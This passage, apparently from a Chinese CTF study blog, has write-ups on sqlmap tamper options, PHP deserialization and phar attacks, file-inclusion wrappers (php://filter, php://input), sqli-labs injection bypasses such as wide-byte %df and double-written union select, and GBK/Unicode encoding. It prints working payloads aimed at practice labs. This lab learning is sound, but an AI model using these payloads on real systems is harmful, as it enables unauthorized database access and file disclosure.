suit抓包后将内容存在txt文档中，这个文档也一般放在sqlmap的根目录中，然后构建下面这个指令（文件存入1.txt中）：python sqlmap.py -r 1.txt --dbs 为什么推荐下面这种做法呢，一个是因为这样构造的指令比较简单，另一个是因为这样当我们设置高level时就会检测文件头中的其他参数，下面介绍sqlmap的几个等级： –level 1：默认值，能测试的语句少，速度快 –level 2：测试http、cookie –level 3：测试user-agent、referer 当level为5时会测试很多的payload，效率会降低。当不清楚注入点时可以将level的值设置为3或以上。 当然当清楚注入点时，也可以用例如--cokkie、--user-agent这类的语句指定注入目标，这样可以不用抓包，也可以不用设置level：python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-19/ --referer=&quot; http://127.0.0.1/sqli-labs-php7/Less-19/*&quot; --dbs Tamper注入时遇到过滤一定是不可避免的，我们可以用sqlmap自带的tamper脚本进行各种的绕过。 例如21关中对cookie需要进行base64解码，我们就可以使用--tamper=base64encode来解决 不过在我们不太清楚具体过滤的内容时，我们可以直接无脑套tamper，虽然效率偏低，但是十分方便：tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotestamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor 总结sqlmap还有很多很强大的功能，下面的链接总结了sqlmap的所有指令可供参考。sqlmap指令大全","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"php反序列化漏洞应用","slug":"php反序列化漏洞应用","date":"2021-11-01T10:07:52.000Z","updated":"2021-11-29T13:50:16.402Z","comments":true,"path":"2021/11/01/php反序列化漏洞应用/","link":"","permalink":"http://example.com/2021/11/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%BA%94%E7%94%A8/","excerpt":"前言同样是buu，同样是极客大挑战，这次遇到了一题有关于php反序列化漏洞，遇到新东西总是要开博客记录的嘛。","text":"前言同样是buu，同样是极客大挑战，这次遇到了一题有关于php反序列化漏洞，遇到新东西总是要开博客记录的嘛。 [极客大挑战 2019]PHP进入网页，我们发现一只猫在网页中心，我们鼠标控制着一团毛线，诶还挺好玩的。咳咳，进入正题，我们抓住题目给我们的提示——备份网站。一般备份网站的备份文件是在www.zip中，当然我们也可以用dirsearch来进行扫描，发现www.zip的状态为200： 接着我们打开备份文件，发现一个flag.php文件，但是显然我们能直接阅读到的并不是真正的flag。那么我们来阅读index.php代码： 12345&lt;?phpinclude &#x27;class.php&#x27;;$select = $_GET[&#x27;select&#x27;];$res=unserialize(@$select);?&gt; 我们注意到了这一行，变量select以GET方式输入，并进行反序列化，而且包含了文件class.php，那么我们打开class.php一探究竟： 123456789101112131415161718192021222324252627282930313233class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125; 这里代码创建了一个结构体Name，设置其中的username与password。那么我们发现，只要设置username=admin&amp;password=100，那么再次执行_destruct就可以回显flag了。 但是这里有个问题，wakeup会导致username被赋值成guest，那么我们就需要改变序列化字符串中对象的个数来绕过，我们使用下面这个程序生成URL： 123456789&lt;?phpclass Name&#123; private $username = &#x27;admin&#x27;; private $password = &#x27;100&#x27;;&#125;$a = new Name();echo urlencode(serialize($a));?&gt; 使用URL编码保证不可打印字符复制时不会丢失（当然也可以不编码），编码与不编码的结果分别如下： 12O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7DO:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125; 将Name后的2改为3（大一点也行），再输入进select中获取flag： 解毕 序列化与反序列化序列化是将变量或对象转换成字符串的过程，而反序列化是将字符串转化为变量或对象的过程，序列化与反序列化主要是为了方便对象的传输。一般在php中常用的序列化与反序列化方式有：serialize，unserialize；json_encode，json_decode一般在ctf中前者的使用更多。 这里介绍php序列化和反序列化基本类型表达： 布尔型：b:value =&gt; b:0 整数型：i:value =&gt; i:1 字符串型：s:length:value =&gt;s:4 “aaaa” 数组型：a::{key, value pairs} =&gt;a:1:{i:1;s:1 “a”} 对象型：O: NULL型：N 下面这篇博客中详细剖析了PHP序列化与反序列化，想要详细学习可以参考，本篇博客不做详细的介绍。深度剖析PHP序列化和反序列化 反序列化漏洞的利用（随时更新）利用这个漏洞有两个条件： unserialize()函数的参数是可控的 php中有可利用的类并且类中含有魔术方法 魔术方法中存在任意代码执行的eval 然后再介绍一批魔术方法： 1234567__construct()：创建对象时初始化__destruct()：结束时销毁对象__toString()：对象被当作字符串时使用__sleep()：序列化对象之前调用__wakeup()：反序列化之前调用__call()：调用对象不存在时使用__get()：调用私有属性时使用 由此我们可以看出，当传给反序列化函数的参数可控时，我们可以传入一个序列化字符串从而控制对象内部的变量甚至函数。那么我们来详细介绍几个常见的反序列化漏洞的应用。 CVE-2016-7124（_wakeup()绕过）当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，也就是上面的例题中我们使用的绕过方法，这里不再赘述。 phar反序列化phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都被储存在phar文件内容描述着部分中。而这个部分还会以序列化形式存储用户自定义的meta-data，这是攻击的核心部分。 phar归档文件有三种格式：tar归档、zip归档和phar归档。phar格式的文件允许我们完全控制文件的起始部分，而最小的标志（stub）可以作为任意数据的前缀，也是phar文件中的第一项。因此我们可以伪造文件头来绕过对文件格式的检测，我们可以构造一个既是合法jpeg文件又是一个合法的phar文件。 要生成phar文件，我们首先要修改php.ini中phar.readonly的选项，删去前面的分号，并将On改为Off。接着我们生成phar文件： 12345678910111213&lt;?php class Test&#123; &#125; @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置Stub $o = new Test(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 $phar-&gt;stopBuffering();?&gt; 用010打开文件就会发现序列化对象已被存入了phar文件当中。 而phar的攻击面是很广泛的，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，以下函数都受到了影响： 那么这里我们就可以编写程序进行反序列化漏洞的攻击了： 123456789&lt;?phpclass Test&#123; public function __destruct()&#123; echo &quot;i&#x27;m ok&quot;; &#125;&#125;$file = &#x27;phar://phar.phar/test.txt&#x27;;file_get_contents($file);?&gt; 最后我们发现触发成功。 others wait to update由于查阅了其他人写的博客发现这里面的水很深，因此在以后每碰到一种新的方式都会在这前面进行更新。 总结刷buu发现还有很多的新知识等待掌握，刷题还是很有效果的。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"php文件包含漏洞利用","slug":"php文件包含漏洞利用","date":"2021-10-30T03:15:42.000Z","updated":"2021-11-24T06:37:05.482Z","comments":true,"path":"2021/10/30/php文件包含漏洞利用/","link":"","permalink":"http://example.com/2021/10/30/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","excerpt":"前言上次校赛的web3以及在做buu时都遇到了文件包含的问题，就开篇博客学习记录php文件包含漏洞的利用。","text":"前言上次校赛的web3以及在做buu时都遇到了文件包含的问题，就开篇博客学习记录php文件包含漏洞的利用。 引子[ACTF2020新生赛]include这题只是一个单纯的文件包含没什么意思，我就从[极客大挑战]secret file这题讲起 进入网页，似乎什么有用的信息也没有，直接F12用查看器查看HTML，发现了这么一行： 1&lt;a id=&quot;master&quot; href=&quot;./Archive_room.php&quot; style=&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;/a&gt; 这个页面中有一个地方隐藏着一个Oh! You found me，点击后会跳转到Archive_room.php中，但是由于颜色与背景色设置一致导致我们没法直接看到，我们可以左键鼠标拖动使其显性，也可以直接通过URL进入下一个php文件中。 进入下一个页面，这次这个秘密似乎直接贴在了我们的脸上，但是当我们点击进secret后，很快啊告诉我们查阅结束，我们F12查看后发现整个过程应该是先进入了action.php，然后再很快地跳转到了end.php中。那么我们估计关键就藏在了action.php中，那么我们对网页进行抓包： 果然，secr3t.php就藏在了action.php中，那么我们直接进入下一步，页面中出现的是一串代码： 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag放在了flag.php里?&gt;&lt;/html&gt; 相当经典的一串文件包含代码，这里用到文件包含中的php://filter，然后我们读取文件中的代码，只需要进行base64编码，这样文件就不会被执行，而是通过base64的方式返回，因为被base64编码后再传入include函数，就不会被认为是php文件，那么文件就不会执行，而是输出文件的base64编码，那么我们再进行解码即可。?file=php://filter/read=convert.base64-encode/resource=flag.php 在F12中获取base64码： 1PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MDM4NzE4NTktNjVlYi00Y2ZjLTk1ZjktMDZlMmI0MTliMDI2fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo= 最后解码： 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;FLAG&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt; &lt;?php echo &quot;我就在这里&quot;; $flag = &#x27;flag&#123;03871859-65eb-4cfc-95f9-06e2b419b026&#125;&#x27;; $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27; ?&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 解毕 php文件包含漏洞利用看完了上面的例题，我们也能大体了解到文件包含的一些眉目了。我们要知道，include()函数对文件后缀名无要求，而对其中的语法有要求。因此无论文件格式是txt，php还是jpg等，只要内容符合的格式就可以执行。接下来详细介绍各种类型的文件包含漏洞的应用。 php://filterphp://filter可以作为一个中间流来处理其他流，可以进行任意文件的读取，这个协议可以用来过滤一些东西。我们可以设置参数： resource=&lt;要过滤的数据流&gt;：指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt;：可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的筛选列表&gt;：可以设定一个或多个过滤器名称，以管道符（|）分隔 &lt;；两个链的筛选列表&gt;：任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 在校赛中用的是rot13编码，如果使用rot-13，则该方法仅限于当short_open_tag不开启的时候，而且resource的数据流也没有直接给，不过在ctf比赛中一般的数据流都是flag或者关于flag的变种形式。而这种形式的文件包含也是目前我们能见到最多的。 总之，php://filter协议有一下几个应用： 利用base64获得源码 通过读写编码实行绕过操作 php://inputphp://input的使用只需要php://input 是个可以访问请求的原始数据的只读流。POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。将要执行的语法php代码写在post中提交，不用键与值的形式，只写代码即可。因此，我们可以用这个代码查看phpinfo等更重要的页面，只需要我们POST一个完整的php语句就行了： 12?page=php://inputPOST:&lt;?php phpinfo(); ?&gt; 关于php://类型的协议在php手册中有更详细的介绍：php://input详解- Manual file://简单来说和php://filter类似，但是访问本地文件时只能传入绝对路径来读取，因此在做题时基本是完全用不上的类型。 phar:// &amp; zip://这两者都是用来查找指定压缩包内的文件，区别就在于前者可以传入绝对路径与相对路径，而后者只能传入绝对路径，且在使用后者时要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23。 data:也是可以直接传入代码，格式为：data: text/plain,&lt;?php payload ?&gt; 当然也可以使用base64编码：data:text/plain;base64,payload（编码过的）还要记得base64编码后的=与+要手动进行URL编码。 http://include也可以传入外部链接，这个可以标记以下，说不定以后有大用。 总结文件包含漏洞的应用是目前我们遇到题目中的常用解法之一，当然还有其他例如堆叠注入等等都值得我们去探索学习。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"sqli-labs练习-less-29-37","slug":"sqli-labs练习-less-29-37","date":"2021-10-28T12:47:12.000Z","updated":"2021-11-19T14:52:14.318Z","comments":true,"path":"2021/10/28/sqli-labs练习-less-29-37/","link":"","permalink":"http://example.com/2021/10/28/sqli-labs%E7%BB%83%E4%B9%A0-less-29-37/","excerpt":"前言这几关主要练习waf与单引号过滤的绕过，其中29-31关需要配置好tomcat并开启服务，接下来开始解题ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。","text":"前言这几关主要练习waf与单引号过滤的绕过，其中29-31关需要配置好tomcat并开启服务，接下来开始解题ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。 less29-31三关一起写，因为除了字符型注入类型不同，其他方面几乎都是一致的。我们先看源代码： 12$qs = $_SERVER[&#x27;QUERY_STRING&#x27;];$hint=$qs; 源码中出现了$_SERVER函数，关于这个函数的具体用法可以参考本段最后的链接。中括号中的元素为’QUERY_STRING’，意思是查询字符串，如果有的话通过它进行页面访问。而我们发现这关还有一个login.php文件，这就意味着这关其实是两个服务器在进行作用。PHP手册：$_SERVER函数 那么我们来看看login.php： 123456789101112131415161718192021222324252627282930313233function whitelist($input)&#123; $match = preg_match(&quot;/^\\d+$/&quot;, $input); if($match) &#123; //echo &quot;you are good&quot;; //return $match; &#125; else &#123; header(&#x27;Location: hacked.php&#x27;); //echo &quot;you are bad&quot;; &#125;&#125;function java_implimentation($query_string)&#123; $q_s = $query_string; $qs_array= explode(&quot;&amp;&quot;,$q_s); foreach($qs_array as $key =&gt; $value) &#123; $val=substr($value,0,2); if($val==&quot;id&quot;) &#123; $id_value=substr($value,3,30); return $id_value; echo &quot;&lt;br&gt;&quot;; break; &#125; &#125;&#125; 这两个自定义函数可以说是这个php文件中的重中之重，先介绍下其中的explode()与foreach()。 explode()把字符串打散为数组，例如$str=”Hello World”在explode(“ “;$str)函数作用下就被打散成了Array([0] =&gt; Hello [1] =&gt; World) 而foreach()函数主要作用就是遍历数组，将数组被分割的数组一一输出出来。这个函数有两种语法： foreach (array_expression as $value):每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步 foreach (array_expression as $key =&gt; $value)：同语句一，同时当前单元的键名在每次循环中赋值给$key 这两个自定义函数的效果就是将语句从“&amp;”中分割开，然后再分割开的数组的前两位找id值，如果找到了就截取这个数组的第4位到30位的长度交给preg_match()进行正则匹配。 这种过滤就和相当于一个waf了，是相当强的过滤。但是结合源码我们发现，tomcat获取的是第一个数据，而处理我们想要数据的apache获取的是第二个数据。因此这题的思路就是构建payload让tomcat取得第一个数据，而我们的注入的语句从第二个语句中注入：?id=1&amp;id=0&#39;union select 1,database(),3 --+ 这样这题就解出来了，接下来就是老流程了。 less-30双引号注入，less-31双引号加括号注入，语句构建思路与29关完全一致。 less32-33&amp;36直奔32关，老规矩上源码： 12345678function check_addslashes($string)&#123; $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\\\\\\\&quot;, $string); //escape any backslash $string = preg_replace(&#x27;/\\&#x27;/i&#x27;, &#x27;\\\\\\&#x27;&#x27;, $string); //escape single quote with a backslash $string = preg_replace(&#x27;/\\&quot;/&#x27;, &quot;\\\\\\&quot;&quot;, $string); //escape double quote with a backslash return $string;&#125; 第一句的作用是搜索id中的单引号与反斜杠并用斜杠进行替代，后面两句的作用是为了防止你对反斜杠进行注释。 这里也介绍一下preg_quote()函数，这个函数的功能为向其中每个正则表达式语法中的字符前增加一个反斜线，正则表达式特殊字符如下：. \\ + * ? [ ^ ] $ ( ) &#123; &#125; = ! &lt; &gt; | : - 接着是这句代码：mysql_query(&quot;SET NAMES gbk&quot;);通过这句语句程序对对$con1进行gbk编码，关于编码的内容在我的上一篇博客进行了介绍，可供参考：学习解析Unicode与gbk编码 我们知道gbk编码中英文及符号等都是两个字符，因此我们构建payload时可以使用%aa或者%df将反斜杠给吞掉。这里分析原理：&#39;URL编码为%5c%27，在前面加上一个%aa，就构成了%aa%5c%27，在进行gbk编码后将两个字节当成了一个汉字，此时%27就被独立了出来，因此单引号就被成功注入进去了。 了解了原理，我们就能进行payload构建了：?id=-1%df&#39;union select 1,database(),3 --+ 最后愉快爆库，不过要注意，由于单引号被过滤，因此在爆表等操作时记得将’security’进行十六进制编码来绕过过滤。 less-33与32关的区别在于这关使用了addslashes()函数进行过滤操作，而上关是preg_quote()，构建payload思路与32关一致。而less-36则是使用了mysql_real_escape_string()进行过滤，本质上都没什么差别。 less-34&amp;37这两关解法一致一起写了。这关是POST注入，burp suite直接拉出来用。有人会问为什么不用hackbar呢，我们来分析一下： 首先这题依然是宽字符注入，因此我们构建payload：uname=admin%a0&#39;union select 1,database(),#&amp;passwd=1&amp;submit=Submit我们发现登录失败了，这是怎么回事呢，我们抓包来看看：uname=admin%25a0%27union+select+1%2Cdatabase%28%29%2C+%23&amp;passwd=1&amp;submit=Submit admin与a0之间多出了一个%25，这是因为在POST上传数据时，原来%a0前的那个“%”被URL编码成%25，因此我们只需要将这个25删掉就行了，当然在Requset中直接进行注入也是可以的： 同样记得在爆表等操作时记得编码，同32关一样，盲注和报错注入同样可以操作。 这里还有一个方法，�法，直接上效果： 而37关区别只是使用了mysql_real_escape_string()函数进行过滤。 less-35这关最有意思，转义了引号，结果源码的查询语句没加引号：$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 那这题就不是字符型注入了，而是数值型注入，因此我们直接构建payload，记得编码绕过过滤。这道题只能说回归初心了。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"学习解析Unicode与gbk编码","slug":"学习解析Unicode与gbk编码","date":"2021-10-25T02:56:38.000Z","updated":"2022-01-14T06:15:23.189Z","comments":true,"path":"2021/10/25/学习解析Unicode与gbk编码/","link":"","permalink":"http://example.com/2021/10/25/%E5%AD%A6%E4%B9%A0%E8%A7%A3%E6%9E%90Unicode%E4%B8%8Egbk%E7%BC%96%E7%A0%81/","excerpt":"前言在做sqli-labs的less-32及后几关时接触到了宽字节注入，就学习了以上四种编码方式并且进行了辨析，通过这篇博客以记录下来。","text":"前言在做sqli-labs的less-32及后几关时接触到了宽字节注入，就学习了以上四种编码方式并且进行了辨析，通过这篇博客以记录下来。 从ascii开始我们都知道计算机只能识别0和1的二进制语言，因此当我们想要表示字母或者数字时需要一个规则进行转换，因此我们有了ascii字符集。但是ascii只用了7bits来表示字符，后来经过补充用8bits，这对英文来说足够了，可是世界上还有千千万万个其他文字，1个字节显然是不够的，因此，宽字符就出现了。 Unicode就起到了补充作用，事实上，Unicode对计算机全球化发展起到了巨大作用。因为各个国家之间都推出了各自的编码标准，这些标准没有一个统一值，例如gbk就是中国标准，只在中国使用，而Unicode把全球所有语言统一到了一个编码里。 Unicode与UTF-8&amp;16Unicode（UCS-2）编码遵循着中英文及其符号全部占用2个字节，如果是一个英文字母，其二进制表达为（以s为例）：00000000 01110011而一个汉字的二进制表达式为（以“日”字为例）：01100101 11100101 在Unicode字符集中，一个字符对应的一个十六进制，我们可以发现英文的二进制码前9位全部都是0，占据两个字节实在是一种浪费，这时候UTF就派上用场了。 首先是UTF-8,对于英文字母这类单字节字符，UTF-8会将字节第一位设置为0，此时这个第一个0相当于代替了9个0，因此英文字符这类的字符只占用一个字节，与ascii码值完全相同。 而对于多个字节的字符，就要转换为多字节的UTF-8，而中文在UTF-8中属于三字节。UTF-8对于n个字节的编码方式为，第一个字节的前n位用1表示，第n+1位用0表示，后面字节的前两位用10表示。 那么s与日的UTF-8编码就是如下所示：s:01110011日：11100110 10010111 10100101 是的，汉字在UTF-8中占据了3个字符，这就导致了在使用纯中文时反而消耗了更多的内存，因此对于纯中文UTF-8不是很友好。这时，我们把目光聚焦在UTF-16。 UTF-16的编码中字符一般占两个字节，因此有些人会将Unicode和UTF-16的概念混作一谈，这是错误的。但其实UTF-16编码的泛用性还是没有UTF-8广，因为UTF-16存在大小端字节序问题，容错率也更低。反观UTF-8局部的字节错误（丢失、增加、改变）不会导致连锁性的错误，因为UTF-8 的字符边界很容易检测出来。而url编码就是在uft-8编码的基础上，给编码的每个字节加上百分号。 这里给出不同编码方式的文件头： 12345EF BB BF UTF-8FE FF UTF-16/UCS-2, little endianFF FE UTF-16/UCS-2, big endianFF FE 00 00 UTF-32/UCS-4, little endian.00 00 FE FF UTF-32/UCS-4, big-endian. 走近gbk在了解gbk之前，我们要先了解GB2312，而在了解GB2312之前，我们先认识下区位码。区位码是1980年中国制定的编码标准，每一个字符都有一个对应的四位编号，前两位为“区”，后两位为“位”，而中文汉字的区码为16。 GB2312编码正是基于区位码用双字节编码表示中文的，编码方式一般为0xA0+区号 0xA0+位号。而当编码对象是英文或数字时，一般情况下直接使用ascii编码。不过这里有个有意思的情况： 120x320xA3 0xB2 0x32自然是代表着2，那么下面那个根据GB2312编码的结果应该也为2，这两个2有什么区别呢？有，ascii码对应的2是半角字符，而GB2312编码的2是全角字符。 而gbk，即汉字国际扩展码，在GB2312的基础上进行了拓展，涵盖了Unicode中所有的汉字，因此也可以Unicode一一对应。和前面说到的GB2312不同，有的字的编码比0xA0 0xA0还小，但是其实只补充了计算机编码表，区位码是没有更新的。微软Windows安排给GBK的code page（代码页）是CP936，所以有时候看到编码格式是CP936，其实就是GBK的意思。 同一个编码文件里，高字节最高位为0则为ascii，为1则为中文。 总结学习这些编码的原理，对于我们继续进行的靶场练习可以提供一定的帮助，了解到计算机是如何编码我们的文字的，不过这也算不顾正业一回了吧。","categories":[{"name":"other","slug":"other","permalink":"http://example.com/categories/other/"}],"tags":[{"name":"-编码","slug":"编码","permalink":"http://example.com/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"sqli-lab练习-less-28及特殊不可打印字符","slug":"sqli-lab练习-less-28及特殊不可打印字符","date":"2021-10-23T03:06:28.000Z","updated":"2021-12-01T08:28:35.452Z","comments":true,"path":"2021/10/23/sqli-lab练习-less-28及特殊不可打印字符/","link":"","permalink":"http://example.com/2021/10/23/sqli-lab%E7%BB%83%E4%B9%A0-less-28%E5%8F%8A%E7%89%B9%E6%AE%8A%E4%B8%8D%E5%8F%AF%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6/","excerpt":"前言专门把第28关单拿出来,是因为在做题时遇到了一些问题，就拿出来单写一篇博客。ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。","text":"前言专门把第28关单拿出来,是因为在做题时遇到了一些问题，就拿出来单写一篇博客。ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。 less-28先讲解题思路。通过标题提示与源码的分析，我们知道这题除了过滤注释符与空格之外，还将连续的union select给过滤了： 12345678910$id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;, $id); //strip out /*$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id); //Strip out --.$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id); //Strip out #.$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id); //Strip out spaces.//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);//Strip out spaces.$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id) //Strip out spaces.$id= preg_replace(&#x27;/union\\s+select/i&#x27;,&quot;&quot;, $id); //Strip out UNION &amp; SELECT.return $id; 过滤是相当严格的，不过我们已经学习了这么多注入方法，既然联合注入语句内容被过滤，我们可以使用盲注法来注入（由于报错不会回显因此不考虑报错注入）。但是我们要练习的就是绕过过滤的方法，因此我们依然采用联合查询进行注入。 关于注释符与空格的绕过上篇博客已经介绍过了，这里来介绍如何绕过对union select的过滤（单引号+括号注入）： 123?id=0&#x27;)unionunion%0aselect%0aselect%0a1,database(),3;%00?id=0&#x27;)ununion%0aselection%0aselect%0a1,database(),3;%00 这种方法是双写绕过，我们发现输入后页面在hint部分回显内容都为正常的联合查询语句，原理都是让union%0aselect被过滤，剩下的内容刚好构成一个新的union%0aselect，从而进行联合查询，当然这里的%a0可以替换为其他不可打印字符代替。 到这里我们就可以进行爆库操作了。 关于%a0分析这道题其实已经解完了，但是我们在回顾源码中关于union select的过滤语句：$id= preg_replace(&#39;/union\\s+select/i&#39;,&quot;&quot;, $id); union的后面有一个\\s+，这就意味着所有的空格、空白符以及换行符在这里全部都被过滤了，而这个加号意味着多次匹配，因此我们也不能通过双写空格的方式来绕过。但在这其中，有一个例外：%a0 注意到这个玩意也是我发现其他人构建了一句这样的语句：?id=0&#39;)union%a0select(1),(database()),(3);%00 %a0是经过URL编码的不可打印字符，代表的是空格，按道理来说是应该要被过滤掉的，但是居然没有，相当神奇。不过我们在linux下跑php7靶场时，发现了问题： 我们想要的数据库名称居然没有正常回显，看下hint的显示，union与select之间居然出现了一个奇怪的符号，这就相当离谱了，我们回主机的靶场上跑： 翻译翻译什么叫惊喜，这就叫惊喜，hint语句出来是一样的，但是主机靶场就是不讲道理地回显了数据库名。这里我们开始做推测： linux系统下读取解析%a0结果与windows系统下结果不同，导致在linux系统下出现语法错误 php版本不同导致%a0解析结果不同 在此之前，我们首先了解到了这个%a0在此处被解析出的结果，它是空格，但又不完全是，因为如果是空格的话，例如我们使用%0a替换%a0，hint回显应该是连union select一起被过滤了，很显然这里却没有，但是在主机靶场中这个%a0又起到了空格的作用。 通过在主机另外搭建了一个php7的靶场测试，发现hint是一样的，但是没有数据库名的回显，这证明了php版本是肯定有问题的，但是第一点暂时没有证明，因为现在的linux系统只能安装php7及以上版本。 通过资料我们发现，%a0解析成空格只有在php5.2.17版本可以通过成功，目前看来应该是php版本的问题。28a采用盲注就行了，甚至28a连空格和注释符都没过滤。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web 